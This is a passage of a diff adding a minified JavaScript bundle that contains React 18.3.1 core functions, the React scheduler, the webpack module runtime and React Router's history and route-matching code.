+                if (null === e || void 0 === e) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
+                var a = m({}, e.props),
+                    s = e.key,
+                    o = e.ref,
+                    i = e._owner;
+                if (null != t) {
+                    if (void 0 !== t.ref && (o = t.ref, i = x.current), void 0 !== t.key && (s = "" + t.key), e.type && e.type.defaultProps) var l = e.type.defaultProps;
+                    for (c in t) k.call(t, c) && !S.hasOwnProperty(c) && (a[c] = void 0 === t[c] && void 0 !== l ? l[c] : t[c])
+                }
+                var c = arguments.length - 2;
+                if (1 === c) a.children = r;
+                else if (1 < c) {
+                    l = Array(c);
+                    for (var u = 0; u < c; u++) l[u] = arguments[u + 2];
+                    a.children = l
+                }
+                return {
+                    $$typeof: n,
+                    type: e.type,
+                    key: s,
+                    ref: o,
+                    props: a,
+                    _owner: i
+                }
+            }, t.createContext = function(e) {
+                return (e = {
+                    $$typeof: l,
+                    _currentValue: e,
+                    _currentValue2: e,
+                    _threadCount: 0,
+                    Provider: null,
+                    Consumer: null,
+                    _defaultValue: null,
+                    _globalName: null
+                }).Provider = {
+                    $$typeof: i,
+                    _context: e
+                }, e.Consumer = e
+            }, t.createElement = E, t.createFactory = function(e) {
+                var t = E.bind(null, e);
+                return t.type = e, t
+            }, t.createRef = function() {
+                return {
+                    current: null
+                }
+            }, t.forwardRef = function(e) {
+                return {
+                    $$typeof: c,
+                    render: e
+                }
+            }, t.isValidElement = j, t.lazy = function(e) {
+                return {
+                    $$typeof: h,
+                    _payload: {
+                        _status: -1,
+                        _result: e
+                    },
+                    _init: P
+                }
+            }, t.memo = function(e, t) {
+                return {
+                    $$typeof: d,
+                    type: e,
+                    compare: void 0 === t ? null : t
+                }
+            }, t.startTransition = function(e) {
+                var t = A.transition;
+                A.transition = {};
+                try {
+                    e()
+                } finally {
+                    A.transition = t
+                }
+            }, t.unstable_act = L, t.useCallback = function(e, t) {
+                return O.current.useCallback(e, t)
+            }, t.useContext = function(e) {
+                return O.current.useContext(e)
+            }, t.useDebugValue = function() {}, t.useDeferredValue = function(e) {
+                return O.current.useDeferredValue(e)
+            }, t.useEffect = function(e, t) {
+                return O.current.useEffect(e, t)
+            }, t.useId = function() {
+                return O.current.useId()
+            }, t.useImperativeHandle = function(e, t, n) {
+                return O.current.useImperativeHandle(e, t, n)
+            }, t.useInsertionEffect = function(e, t) {
+                return O.current.useInsertionEffect(e, t)
+            }, t.useLayoutEffect = function(e, t) {
+                return O.current.useLayoutEffect(e, t)
+            }, t.useMemo = function(e, t) {
+                return O.current.useMemo(e, t)
+            }, t.useReducer = function(e, t, n) {
+                return O.current.useReducer(e, t, n)
+            }, t.useRef = function(e) {
+                return O.current.useRef(e)
+            }, t.useState = function(e) {
+                return O.current.useState(e)
+            }, t.useSyncExternalStore = function(e, t, n) {
+                return O.current.useSyncExternalStore(e, t, n)
+            }, t.useTransition = function() {
+                return O.current.useTransition()
+            }, t.version = "18.3.1"
+        },
+        43: (e, t, n) => {
+            e.exports = n(202)
+        },
+        579: (e, t, n) => {
+            e.exports = n(153)
+        },
+        234: (e, t) => {
+            function n(e, t) {
+                var n = e.length;
+                e.push(t);
+                e: for (; 0 < n;) {
+                    var r = n - 1 >>> 1,
+                        a = e[r];
+                    if (!(0 < s(a, t))) break e;
+                    e[r] = t, e[n] = a, n = r
+                }
+            }
+
+            function r(e) {
+                return 0 === e.length ? null : e[0]
+            }
+
+            function a(e) {
+                if (0 === e.length) return null;
+                var t = e[0],
+                    n = e.pop();
+                if (n !== t) {
+                    e[0] = n;
+                    e: for (var r = 0, a = e.length, o = a >>> 1; r < o;) {
+                        var i = 2 * (r + 1) - 1,
+                            l = e[i],
+                            c = i + 1,
+                            u = e[c];
+                        if (0 > s(l, n)) c < a && 0 > s(u, l) ? (e[r] = u, e[c] = n, r = c) : (e[r] = l, e[i] = n, r = i);
+                        else {
+                            if (!(c < a && 0 > s(u, n))) break e;
+                            e[r] = u, e[c] = n, r = c
+                        }
+                    }
+                }
+                return t
+            }
+
+            function s(e, t) {
+                var n = e.sortIndex - t.sortIndex;
+                return 0 !== n ? n : e.id - t.id
+            }
+            if ("object" === typeof performance && "function" === typeof performance.now) {
+                var o = performance;
+                t.unstable_now = function() {
+                    return o.now()
+                }
+            } else {
+                var i = Date,
+                    l = i.now();
+                t.unstable_now = function() {
+                    return i.now() - l
+                }
+            }
+            var c = [],
+                u = [],
+                d = 1,
+                h = null,
+                f = 3,
+                p = !1,
+                m = !1,
+                g = !1,
+                v = "function" === typeof setTimeout ? setTimeout : null,
+                y = "function" === typeof clearTimeout ? clearTimeout : null,
+                b = "undefined" !== typeof setImmediate ? setImmediate : null;
+
+            function w(e) {
+                for (var t = r(u); null !== t;) {
+                    if (null === t.callback) a(u);
+                    else {
+                        if (!(t.startTime <= e)) break;
+                        a(u), t.sortIndex = t.expirationTime, n(c, t)
+                    }
+                    t = r(u)
+                }
+            }
+
+            function _(e) {
+                if (g = !1, w(e), !m)
+                    if (null !== r(c)) m = !0, A(k);
+                    else {
+                        var t = r(u);
+                        null !== t && I(_, t.startTime - e)
+                    }
+            }
+
+            function k(e, n) {
+                m = !1, g && (g = !1, y(j), j = -1), p = !0;
+                var s = f;
+                try {
+                    for (w(n), h = r(c); null !== h && (!(h.expirationTime > n) || e && !N());) {
+                        var o = h.callback;
+                        if ("function" === typeof o) {
+                            h.callback = null, f = h.priorityLevel;
+                            var i = o(h.expirationTime <= n);
+                            n = t.unstable_now(), "function" === typeof i ? h.callback = i : h === r(c) && a(c), w(n)
+                        } else a(c);
+                        h = r(c)
+                    }
+                    if (null !== h) var l = !0;
+                    else {
+                        var d = r(u);
+                        null !== d && I(_, d.startTime - n), l = !1
+                    }
+                    return l
+                } finally {
+                    h = null, f = s, p = !1
+                }
+            }
+            "undefined" !== typeof navigator && void 0 !== navigator.scheduling && void 0 !== navigator.scheduling.isInputPending && navigator.scheduling.isInputPending.bind(navigator.scheduling);
+            var x, S = !1,
+                E = null,
+                j = -1,
+                T = 5,
+                C = -1;
+
+            function N() {
+                return !(t.unstable_now() - C < T)
+            }
+
+            function R() {
+                if (null !== E) {
+                    var e = t.unstable_now();
+                    C = e;
+                    var n = !0;
+                    try {
+                        n = E(!0, e)
+                    } finally {
+                        n ? x() : (S = !1, E = null)
+                    }
+                } else S = !1
+            }
+            if ("function" === typeof b) x = function() {
+                b(R)
+            };
+            else if ("undefined" !== typeof MessageChannel) {
+                var P = new MessageChannel,
+                    O = P.port2;
+                P.port1.onmessage = R, x = function() {
+                    O.postMessage(null)
+                }
+            } else x = function() {
+                v(R, 0)
+            };
+
+            function A(e) {
+                E = e, S || (S = !0, x())
+            }
+
+            function I(e, n) {
+                j = v((function() {
+                    e(t.unstable_now())
+                }), n)
+            }
+            t.unstable_IdlePriority = 5, t.unstable_ImmediatePriority = 1, t.unstable_LowPriority = 4, t.unstable_NormalPriority = 3, t.unstable_Profiling = null, t.unstable_UserBlockingPriority = 2, t.unstable_cancelCallback = function(e) {
+                e.callback = null
+            }, t.unstable_continueExecution = function() {
+                m || p || (m = !0, A(k))
+            }, t.unstable_forceFrameRate = function(e) {
+                0 > e || 125 < e ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : T = 0 < e ? Math.floor(1e3 / e) : 5
+            }, t.unstable_getCurrentPriorityLevel = function() {
+                return f
+            }, t.unstable_getFirstCallbackNode = function() {
+                return r(c)
+            }, t.unstable_next = function(e) {
+                switch (f) {
+                    case 1:
+                    case 2:
+                    case 3:
+                        var t = 3;
+                        break;
+                    default:
+                        t = f
+                }
+                var n = f;
+                f = t;
+                try {
+                    return e()
+                } finally {
+                    f = n
+                }
+            }, t.unstable_pauseExecution = function() {}, t.unstable_requestPaint = function() {}, t.unstable_runWithPriority = function(e, t) {
+                switch (e) {
+                    case 1:
+                    case 2:
+                    case 3:
+                    case 4:
+                    case 5:
+                        break;
+                    default:
+                        e = 3
+                }
+                var n = f;
+                f = e;
+                try {
+                    return t()
+                } finally {
+                    f = n
+                }
+            }, t.unstable_scheduleCallback = function(e, a, s) {
+                var o = t.unstable_now();
+                switch ("object" === typeof s && null !== s ? s = "number" === typeof(s = s.delay) && 0 < s ? o + s : o : s = o, e) {
+                    case 1:
+                        var i = -1;
+                        break;
+                    case 2:
+                        i = 250;
+                        break;
+                    case 5:
+                        i = 1073741823;
+                        break;
+                    case 4:
+                        i = 1e4;
+                        break;
+                    default:
+                        i = 5e3
+                }
+                return e = {
+                    id: d++,
+                    callback: a,
+                    priorityLevel: e,
+                    startTime: s,
+                    expirationTime: i = s + i,
+                    sortIndex: -1
+                }, s > o ? (e.sortIndex = s, n(u, e), null === r(c) && e === r(u) && (g ? (y(j), j = -1) : g = !0, I(_, s - o))) : (e.sortIndex = i, n(c, e), m || p || (m = !0, A(k))), e
+            }, t.unstable_shouldYield = N, t.unstable_wrapCallback = function(e) {
+                var t = f;
+                return function() {
+                    var n = f;
+                    f = t;
+                    try {
+                        return e.apply(this, arguments)
+                    } finally {
+                        f = n
+                    }
+                }
+            }
+        },
+        853: (e, t, n) => {
+            e.exports = n(234)
+        }
+    },
+        t = {};
+
+    function n(r) {
+        var a = t[r];
+        if (void 0 !== a) return a.exports;
+        var s = t[r] = {
+            exports: {}
+        };
+        return e[r](s, s.exports, n), s.exports
+    }(() => {
+        var e, t = Object.getPrototypeOf ? e => Object.getPrototypeOf(e) : e => e.__proto__;
+        n.t = function(r, a) {
+            if (1 & a && (r = this(r)), 8 & a) return r;
+            if ("object" === typeof r && r) {
+                if (4 & a && r.__esModule) return r;
+                if (16 & a && "function" === typeof r.then) return r
+            }
+            var s = Object.create(null);
+            n.r(s);
+            var o = {};
+            e = e || [null, t({}), t([]), t(t)];
+            for (var i = 2 & a && r; ("object" == typeof i || "function" == typeof i) && ! ~e.indexOf(i); i = t(i)) Object.getOwnPropertyNames(i).forEach(e => o[e] = () => r[e]);
+            return o.default = () => r, n.d(s, o), s
+        }
+    })(), n.d = (e, t) => {
+        for (var r in t) n.o(t, r) && !n.o(e, r) && Object.defineProperty(e, r, {
+            enumerable: !0,
+            get: t[r]
+        })
+    }, n.g = function() {
+        if ("object" === typeof globalThis) return globalThis;
+        try {
+            return this || new Function("return this")()
+        } catch (e) {
+            if ("object" === typeof window) return window
+        }
+    }(), n.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t), n.r = e => {
+        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+            value: "Module"
+        }), Object.defineProperty(e, "__esModule", {
+            value: !0
+        })
+    };
+    var r, a = n(43),
+        s = n.t(a, 2),
+        o = n(391);
+
+    function i() {
+        return i = Object.assign ? Object.assign.bind() : function(e) {
+            for (var t = 1; t < arguments.length; t++) {
+                var n = arguments[t];
+                for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
+            }
+            return e
+        }, i.apply(this, arguments)
+    }! function(e) {
+        e.Pop = "POP", e.Push = "PUSH", e.Replace = "REPLACE"
+    }(r || (r = {}));
+    const l = "popstate";
+
+    function c(e, t) {
+        if (!1 === e || null === e || "undefined" === typeof e) throw new Error(t)
+    }
+
+    function u(e, t) {
+        if (!e) {
+            "undefined" !== typeof console && console.warn(t);
+            try {
+                throw new Error(t)
+            } catch (n) {}
+        }
+    }
+
+    function d(e, t) {
+        return {
+            usr: e.state,
+            key: e.key,
+            idx: t
+        }
+    }
+
+    function h(e, t, n, r) {
+        return void 0 === n && (n = null), i({
+            pathname: "string" === typeof e ? e : e.pathname,
+            search: "",
+            hash: ""
+        }, "string" === typeof t ? p(t) : t, {
+            state: n,
+            key: t && t.key || r || Math.random().toString(36).substr(2, 8)
+        })
+    }
+
+    function f(e) {
+        let {
+            pathname: t = "/",
+            search: n = "",
+            hash: r = ""
+        } = e;
+        return n && "?" !== n && (t += "?" === n.charAt(0) ? n : "?" + n), r && "#" !== r && (t += "#" === r.charAt(0) ? r : "#" + r), t
+    }
+
+    function p(e) {
+        let t = {};
+        if (e) {
+            let n = e.indexOf("#");
+            n >= 0 && (t.hash = e.substr(n), e = e.substr(0, n));
+            let r = e.indexOf("?");
+            r >= 0 && (t.search = e.substr(r), e = e.substr(0, r)), e && (t.pathname = e)
+        }
+        return t
+    }
+
+    function m(e, t, n, a) {
+        void 0 === a && (a = {});
+        let {
+                window: s = document.defaultView,
+                v5Compat: o = !1
+            } = a,
+            u = s.history,
+            p = r.Pop,
+            m = null,
+            g = v();
+
+        function v() {
+            return (u.state || {
+                idx: null
+            }).idx
+        }
+
+        function y() {
+            p = r.Pop;
+            let e = v(),
+                t = null == e ? null : e - g;
+            g = e, m && m({
+                action: p,
+                location: w.location,
+                delta: t
+            })
+        }
+
+        function b(e) {
+            let t = "null" !== s.location.origin ? s.location.origin : s.location.href,
+                n = "string" === typeof e ? e : f(e);
+            return n = n.replace(/ $/, "%20"), c(t, "No window.location.(origin|href) available to create URL for href: " + n), new URL(n, t)
+        }
+        null == g && (g = 0, u.replaceState(i({}, u.state, {
+            idx: g
+        }), ""));
+        let w = {
+            get action() {
+                return p
+            },
+            get location() {
+                return e(s, u)
+            },
+            listen(e) {
+                if (m) throw new Error("A history only accepts one active listener");
+                return s.addEventListener(l, y), m = e, () => {
+                    s.removeEventListener(l, y), m = null
+                }
+            },
+            createHref: e => t(s, e),
+            createURL: b,
+            encodeLocation(e) {
+                let t = b(e);
+                return {
+                    pathname: t.pathname,
+                    search: t.search,
+                    hash: t.hash
+                }
+            },
+            push: function(e, t) {
+                p = r.Push;
+                let a = h(w.location, e, t);
+                n && n(a, e), g = v() + 1;
+                let l = d(a, g),
+                    c = w.createHref(a);
+                try {
+                    u.pushState(l, "", c)
+                } catch (f) {
+                    if (f instanceof DOMException && "DataCloneError" === f.name) throw f;
+                    s.location.assign(c)
+                }
+                o && m && m({
+                    action: p,
+                    location: w.location,
+                    delta: 1
+                })
+            },
+            replace: function(e, t) {
+                p = r.Replace;
+                let a = h(w.location, e, t);
+                n && n(a, e), g = v();
+                let s = d(a, g),
+                    l = w.createHref(a);
+                u.replaceState(s, "", l), o && m && m({
+                    action: p,
+                    location: w.location,
+                    delta: 0
+                })
+            },
+            go: e => u.go(e)
+        };
+        return w
+    }
+    var g;
+    ! function(e) {
+        e.data = "data", e.deferred = "deferred", e.redirect = "redirect", e.error = "error"
+    }(g || (g = {}));
+    new Set(["lazy", "caseSensitive", "path", "id", "index", "children"]);
+
+    function v(e, t, n) {
+        return void 0 === n && (n = "/"), y(e, t, n, !1)
+    }
+
+    function y(e, t, n, r) {
+        let a = O(("string" === typeof t ? p(t) : t).pathname || "/", n);
+        if (null == a) return null;
+        let s = b(e);
+        ! function(e) {
+            e.sort((e, t) => e.score !== t.score ? t.score - e.score : function(e, t) {
+                let n = e.length === t.length && e.slice(0, -1).every((e, n) => e === t[n]);
+                return n ? e[e.length - 1] - t[t.length - 1] : 0
+            }(e.routesMeta.map(e => e.childrenIndex), t.routesMeta.map(e => e.childrenIndex)))
+        }(s);
+        let o = null;
+        for (let i = 0; null == o && i < s.length; ++i) {
+            let e = P(a);
+            o = N(s[i], e, r)
+        }
+        return o
+    }
+
+    function b(e, t, n, r) {
+        void 0 === t && (t = []), void 0 === n && (n = []), void 0 === r && (r = "");
+        let a = (e, a, s) => {
+            let o = {
+                relativePath: void 0 === s ? e.path || "" : s,
+                caseSensitive: !0 === e.caseSensitive,
+                childrenIndex: a,
+                route: e
+            };
+            o.relativePath.startsWith("/") && (c(o.relativePath.startsWith(r), 'Absolute route path "' + o.relativePath + '" nested under path "' + r + '" is not valid. An absolute child route path must start with the combined path of all its parent routes.'), o.relativePath = o.relativePath.slice(r.length));
+            let i = B([r, o.relativePath]),
+                l = n.concat(o);
+            e.children && e.children.length > 0 && (c(!0 !== e.index, 'Index routes must not have child routes. Please remove all child routes from route path "' + i + '".'), b(e.children, t, l, i)), (null != e.path || e.index) && t.push({
+                path: i,
+                score: C(i, e.index),
+                routesMeta: l
+            })
+        };
+        return e.forEach((e, t) => {
+            var n;
+            if ("" !== e.path && null != (n = e.path) && n.includes("?"))
+                for (let r of w(e.path)) a(e, t, r);
+            else a(e, t)
+        }), t
+    }
+
+    function w(e) {
+        let t = e.split("/");
+        if (0 === t.length) return [];
+        let [n, ...r] = t,
+            a = n.endsWith("?"),
+            s = n.replace(/\?$/, "");
+        if (0 === r.length) return a ? [s, ""] : [s];
+        let o = w(r.join("/")),
+            i = [];
+        return i.push(...o.map(e => "" === e ? s : [s, e].join("/"))), a && i.push(...o), i.map(t => e.startsWith("/") && "" === t ? "/" : t)
+    }
+    const _ = /^:[\w-]+$/,
+        k = 3,
+        x = 2,
+        S = 1,
+        E = 10,
+        j = -2,
+        T = e => "*" === e;
+
+    function C(e, t) {
+        let n = e.split("/"),
+            r = n.length;
+        return n.some(T) && (r += j), t && (r += x), n.filter(e => !T(e)).reduce((e, t) => e + (_.test(t) ? k : "" === t ? S : E), r)
+    }
+
+    function N(e, t, n) {
+        void 0 === n && (n = !1);
+        let {
+                routesMeta: r
+            } = e,
+            a = {},
+            s = "/",
+            o = [];
+        for (let i = 0; i < r.length; ++i) {
+            let e = r[i],
+                l = i === r.length - 1,
+                c = "/" === s ? t : t.slice(s.length) || "/",
+                u = R({
+                    path: e.relativePath,
+                    caseSensitive: e.caseSensitive,
+                    end: l
+                }, c),
+                d = e.route;
+            if (!u && l && n && !r[r.length - 1].route.index && (u = R({
+                    path: e.relativePath,
+                    caseSensitive: e.caseSensitive,
+                    end: !1
+                }, c)), !u) return null;
+            Object.assign(a, u.params), o.push({
+                params: a,
+                pathname: B([s, u.pathname]),
+                pathnameBase: F(B([s, u.pathnameBase])),
+                route: d
+            }), "/" !== u.pathnameBase && (s = B([s, u.pathnameBase]))
+        }
+        return o
+    }
+
+    function R(e, t) {
+        "string" === typeof e && (e = {
+            path: e,
+            caseSensitive: !1,
+            end: !0
+        });
+        let [n, r] = function(e, t, n) {
+                void 0 === t && (t = !1);
+                void 0 === n && (n = !0);
+                u("*" === e || !e.endsWith("*") || e.endsWith("/*"), 'Route path "' + e + '" will be treated as if it were "' + e.replace(/\*$/, "/*") + '" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "' + e.replace(/\*$/, "/*") + '".');
+                let r = [],
+                    a = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, (e, t, n) => (r.push({
+                        paramName: t,
+                        isOptional: null != n
+                    }), n ? "/?([^\\/]+)?" : "/([^\\/]+)"));
+                e.endsWith("*") ? (r.push({
+                    paramName: "*"
+                }), a += "*" === e || "/*" === e ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : n ? a += "\\/*$" : "" !== e && "/" !== e && (a += "(?:(?=\\/|$))");
+                let s = new RegExp(a, t ? void 0 : "i");
+                return [s, r]
+            }(e.path, e.caseSensitive, e.end),
+            a = t.match(n);
+        if (!a) return null;
+        let s = a[0],
+            o = s.replace(/(.)\/+$/, "$1"),
+            i = a.slice(1);
+        return {
+            params: r.reduce((e, t, n) => {
+                let {
+                    paramName: r,
+                    isOptional: a
+                } = t;
+                if ("*" === r) {
+                    let e = i[n] || "";
+                    o = s.slice(0, s.length - e.length).replace(/(.)\/+$/, "$1")
+                }
+                const l = i[n];
+                return e[r] = a && !l ? void 0 : (l || "").replace(/%2F/g, "/"), e
+            }, {}),
+            pathname: s,
+            pathnameBase: o,
+            pattern: e
+        }
+    }
+
+    function P(e) {
+        try {
+            return e.split("/").map(e => decodeURIComponent(e).replace(/\//g, "%2F")).join("/")
+        } catch (t) {
+            return u(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent encoding (' + t + ")."), e
+        }
+    }
+
+    function O(e, t) {
+        if ("/" === t) return e;
+        if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
+        let n = t.endsWith("/") ? t.length - 1 : t.length,
+            r = e.charAt(n);
+        return r && "/" !== r ? null : e.slice(n) || "/"
+    }
+    const A = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;
+
+    function I(e, t) {
+        void 0 === t && (t = "/");
+        let n, {
+                pathname: r,
+                search: a = "",
+                hash: s = ""
+            } = "string" === typeof e ? p(e) : e;
+        if (r)
+            if (o = r, A.test(o)) n = r;
+            else {
+                if (r.includes("//")) {
+                    let e = r;
+                    r = r.replace(/\/\/+/g, "/"), u(!1, "Pathnames cannot have embedded double slashes - normalizing " + e + " -> " + r)
+                }
+                n = r.startsWith("/") ? L(r.substring(1), "/") : L(r, t)
+            } else n = t;
+        var o;
+        return {
+            pathname: n,
+            search: V(a),
+            hash: q(s)
+        }
+    }
+
+    function L(e, t) {
+        let n = t.replace(/\/+$/, "").split("/");
+        return e.split("/").forEach(e => {
+            ".." === e ? n.length > 1 && n.pop() : "." !== e && n.push(e)
+        }), n.length > 1 ? n.join("/") : "/"
+    }
+
+    function D(e, t, n, r) {
+        return "Cannot include a '" + e + "' character in a manually specified `to." + t + "` field [" + JSON.stringify(r) + "].  Please separate it out to the `to." + n + "` field. Alternatively you may provide the full path as a string in <Link to=\"...\"> and the router will parse it for you."
+    }
+
+    function U(e) {
+        return e.filter((e, t) => 0 === t || e.route.path && e.route.path.length > 0)
+    }
+
+    function M(e, t) {
+        let n = U(e);
+        return t ? n.map((e, t) => t === n.length - 1 ? e.pathname : e.pathnameBase) : n.map(e => e.pathnameBase)
+    }
+
+    function z(e, t, n, r) {
+        let a;
+        void 0 === r && (r = !1), "string" === typeof e ? a = p(e) : (a = i({}, e), c(!a.pathname || !a.pathname.includes("?"), D("?", "pathname", "search", a)), c(!a.pathname || !a.pathname.includes("#"), D("#", "pathname", "hash", a)), c(!a.search || !a.search.includes("#"), D("#", "search", "hash", a)));
+        let s, o = "" === e || "" === a.pathname,
+            l = o ? "/" : a.pathname;
+        if (null == l) s = n;
+        else {
+            let e = t.length - 1;
+            if (!r && l.startsWith("..")) {
+                let t = l.split("/");
+                for (; ".." === t[0];) t.shift(), e -= 1;
+                a.pathname = t.join("/")
+            }
+            s = e >= 0 ? t[e] : "/"
+        }
+        let u = I(a, s),
+            d = l && "/" !== l && l.endsWith("/"),
+            h = (o || "." === l) && n.endsWith("/");
+        return u.pathname.endsWith("/") || !d && !h || (u.pathname += "/"), u
+    }
+    const B = e => e.join("/").replace(/\/\/+/g, "/"),
+        F = e => e.replace(/\/+$/, "").replace(/^\/*/, "/"),
+        V = e => e && "?" !== e ? e.startsWith("?") ? e : "?" + e : "",
+        q = e => e && "#" !== e ? e.startsWith("#") ? e : "#" + e : "";
+    Error;
+
+    function W(e) {
+        return null != e && "number" === typeof e.status && "string" === typeof e.statusText && "boolean" === typeof e.internal && "data" in e
+    }
+    const H = ["post", "put", "patch", "delete"],
+        K = (new Set(H), ["get", ...H]);
+    new Set(K), new Set([301, 302, 303, 307, 308]), new Set([307, 308]);
+    Symbol("deferred");
+
+    function G() {
+        return G = Object.assign ? Object.assign.bind() : function(e) {
+            for (var t = 1; t < arguments.length; t++) {
+                var n = arguments[t];
+                for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
+            }
+            return e
+        }, G.apply(this, arguments)
+    }
+    const J = a.createContext(null);
+    const $ = a.createContext(null);
+    const Q = a.createContext(null);
+    const Y = a.createContext(null);
+    const X = a.createContext({
+        outlet: null,
+        matches: [],
+        isDataRoute: !1
+    });
+    const Z = a.createContext(null);
+
+    function ee() {
+        return null != a.useContext(Y)
+    }
+
+    function te() {
+        return ee() || c(!1), a.useContext(Y).location
+    }
+
+    function ne(e) {
+        a.useContext(Q).static || a.useLayoutEffect(e)
+    }
+
+    function re() {
+        let {
+            isDataRoute: e
+        } = a.useContext(X);
+        return e ? function() {
+            let {
+                router: e
+            } = he(ue.UseNavigateStable), t = pe(de.UseNavigateStable), n = a.useRef(!1);
+            return ne(() => {
+                n.current = !0
+            }), a.useCallback(function(r, a) {
+                void 0 === a && (a = {}), n.current && ("number" === typeof r ? e.navigate(r) : e.navigate(r, G({
+                    fromRouteId: t
+                }, a)))
+            }, [e, t])
+        }() : function() {
+            ee() || c(!1);
+            let e = a.useContext(J), {
+                    basename: t,
+                    future: n,
+                    navigator: r
+                } = a.useContext(Q), {
+                    matches: s
+                } = a.useContext(X), {
+                    pathname: o
+                } = te(),
+                i = JSON.stringify(M(s, n.v7_relativeSplatPath)),
+                l = a.useRef(!1);
+            return ne(() => {
+                l.current = !0
+            }), a.useCallback(function(n, a) {
+                if (void 0 === a && (a = {}), !l.current) return;
+                if ("number" === typeof n) return void r.go(n);
+                let s = z(n, JSON.parse(i), o, "path" === a.relative);
+                null == e && "/" !== t && (s.pathname = "/" === s.pathname ? t : B([t, s.pathname])), (a.replace ? r.replace : r.push)(s, a.state, a)
+            }, [t, r, i, o, e])
+        }()
+    }
+
+    function ae(e, t, n, s) {
+        ee() || c(!1);
+        let {
+                navigator: o
+            } = a.useContext(Q), {
+                matches: i
+            } = a.useContext(X),
+            l = i[i.length - 1],
+            u = l ? l.params : {},
+            d = (l && l.pathname, l ? l.pathnameBase : "/");
+        l && l.route;
+        let h, f = te();
+        if (t) {
+            var m;
+            let e = "string" === typeof t ? p(t) : t;
+            "/" === d || (null == (m = e.pathname) ? void 0 : m.startsWith(d)) || c(!1), h = e
+        } else h = f;
+        let g = h.pathname || "/",
+            y = g;
+        if ("/" !== d) {
+            let e = d.replace(/^\//, "").split("/");
+            y = "/" + g.replace(/^\//, "").split("/").slice(e.length).join("/")
+        }
+        let b = v(e, {
+            pathname: y
+        });
+        let w = ce(b && b.map(e => Object.assign({}, e, {
+            params: Object.assign({}, u, e.params),
+            pathname: B([d, o.encodeLocation ? o.encodeLocation(e.pathname).pathname : e.pathname]),
+            pathnameBase: "/" === e.pathnameBase ? d : B([d, o.encodeLocation ? o.encodeLocation(e.pathnameBase).pathname : e.pathnameBase])
+        })), i, n, s);
+        return t && w ? a.createElement(Y.Provider, {
+            value: {
+                location: G({
+                    pathname: "/",
+                    search: "",
+                    hash: "",
+                    state: null,
+                    key: "default"
+                }, h),
+                navigationType: r.Pop
+            }
+        }, w) : w
+    }
+
+    function se() {
+        let e = function() {
+                var e;
+                let t = a.useContext(Z),
+                    n = fe(de.UseRouteError),
+                    r = pe(de.UseRouteError);
+                if (void 0 !== t) return t;
+                return null == (e = n.errors) ? void 0 : e[r]
+            }(),
+            t = W(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e),
+            n = e instanceof Error ? e.stack : null,
+            r = "rgba(200,200,200, 0.5)",
+            s = {
+                padding: "0.5rem",
+                backgroundColor: r
+            };
+        return a.createElement(a.Fragment, null, a.createElement("h2", null, "Unexpected Application Error!"), a.createElement("h3", {
+            style: {
+                fontStyle: "italic"
+            }
+        }, t), n ? a.createElement("pre", {
+            style: s
+        }, n) : null, null)
+    }
+    const oe = a.createElement(se, null);
+    class ie extends a.Component {
+        constructor(e) {
+            super(e), this.state = {
+                location: e.location,
+                revalidation: e.revalidation,
+                error: e.error
+            }
+        }
+        static getDerivedStateFromError(e) {
+            return {
+                error: e
+            }
+        }
+        static getDerivedStateFromProps(e, t) {
+            return t.location !== e.location || "idle" !== t.revalidation && "idle" === e.revalidation ? {
+                error: e.error,
+                location: e.location,
+                revalidation: e.revalidation
+            } : {
+                error: void 0 !== e.error ? e.error : t.error,
+                location: t.location,
+                revalidation: e.revalidation || t.revalidation
+            }
+        }
+        componentDidCatch(e, t) {
+            console.error("React Router caught the following error during render", e, t)
+        }
+        render() {
+            return void 0 !== this.state.error ? a.createElement(X.Provider, {
+                value: this.props.routeContext
+            }, a.createElement(Z.Provider, {
+                value: this.state.error,
+                children: this.props.component
+            })) : this.props.children
+        }
+    }
+
+    function le(e) {
+        let {
+            routeContext: t,
+            match: n,
+            children: r
+        } = e, s = a.useContext(J);
+        return s && s.static && s.staticContext && (n.route.errorElement || n.route.ErrorBoundary) && (s.staticContext._deepestRenderedBoundaryId = n.route.id), a.createElement(X.Provider, {
+            value: t
+        }, r)
+    }
+
+    function ce(e, t, n, r) {
+        var s;
+        if (void 0 === t && (t = []), void 0 === n && (n = null), void 0 === r && (r = null), null == e) {
+            var o;
+            if (!n) return null;
+            if (n.errors) e = n.matches;
+            else {
+                if (!(null != (o = r) && o.v7_partialHydration && 0 === t.length && !n.initialized && n.matches.length > 0)) return null;
+                e = n.matches
+            }
+        }
+        let i = e,
+            l = null == (s = n) ? void 0 : s.errors;
+        if (null != l) {
+            let e = i.findIndex(e => e.route.id && void 0 !== (null == l ? void 0 : l[e.route.id]));
+            e >= 0 || c(!1), i = i.slice(0, Math.min(i.length, e + 1))
+        }
+        let u = !1,
+            d = -1;
+        if (n && r && r.v7_partialHydration)
+            for (let a = 0; a < i.length; a++) {
+                let e = i[a];
+                if ((e.route.HydrateFallback || e.route.hydrateFallbackElement) && (d = a), e.route.id) {
+                    let {
+                        loaderData: t,
+                        errors: r
+                    } = n, a = e.route.loader && void 0 === t[e.route.id] && (!r || void 0 === r[e.route.id]);
+                    if (e.route.lazy || a) {
+                        u = !0, i = d >= 0 ? i.slice(0, d + 1) : [i[0]];
+                        break
+                    }
+                }
+            }
+        return i.reduceRight((e, r, s) => {
+            let o, c = !1,
+                h = null,
+                f = null;
+            var p;
+            n && (o = l && r.route.id ? l[r.route.id] : void 0, h = r.route.errorElement || oe, u && (d < 0 && 0 === s ? (p = "route-fallback", !1 || me[p] || (me[p] = !0), c = !0, f = null) : d === s && (c = !0, f = r.route.hydrateFallbackElement || null)));
+            let m = t.concat(i.slice(0, s + 1)),
+                g = () => {
+                    let t;
